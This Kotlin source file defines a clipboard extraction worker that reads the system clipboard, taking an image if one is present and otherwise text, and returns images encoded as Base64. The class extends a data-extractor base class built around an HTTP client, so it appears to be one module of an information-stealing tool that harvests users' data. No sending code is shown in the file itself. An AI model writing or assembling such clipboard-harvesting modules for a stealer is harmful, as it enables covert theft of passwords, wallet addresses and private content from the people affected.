package net.kerner.entkerner.extractors.standart

import io.ktor.client.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.abstract.SystemFileURI
import net.kerner.entkerner.io.nullPaths
import net.kerner.entkerner.io.toBase64
import java.awt.Toolkit
import java.awt.datatransfer.DataFlavor
import java.awt.image.BufferedImage
import java.io.File

class ClipboardExtractionWorker(ioClient: HttpClient) : AbstractDataExtractor<Any?>(ioClient) {
    override val fileDirectories: SystemFileURI = nullPaths
    override val name: String = "ClipboardExtractor"

    override suspend fun extractData(file: File): Any? {
        val clipboard = Toolkit.getDefaultToolkit().systemClipboard
        val content = if (clipboard.isDataFlavorAvailable(DataFlavor.imageFlavor)) {
            withContext(Dispatchers.IO) {
                clipboard.getData(DataFlavor.imageFlavor)
            }
        } else if(clipboard.isDataFlavorAvailable(DataFlavor.stringFlavor)) {
            withContext(Dispatchers.IO) {
                clipboard.getData(DataFlavor.stringFlavor)
            }
        } else null
        return content
    }

    override suspend fun <V : Any> handleExtractedData(data: Any?): V {
        if (data is String) return data as V
        return (data as BufferedImage).toBase64() as V
    }

}